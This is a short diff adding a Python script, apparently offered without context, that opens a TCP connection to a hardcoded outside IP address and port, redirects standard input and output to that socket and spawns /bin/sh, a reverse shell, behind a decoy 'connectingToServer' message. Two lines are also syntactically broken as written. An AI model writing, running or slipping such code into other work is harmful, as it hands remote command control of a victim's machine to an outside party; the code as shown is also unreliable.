@@ -1,0 +1,9 @@
+import socket, subprocess, os
+os.system("clear")
+print("""connectingToServer...""")
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("18.192.31.165",18025))
+os.dup2(s.fileno(),0) os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/sh")'
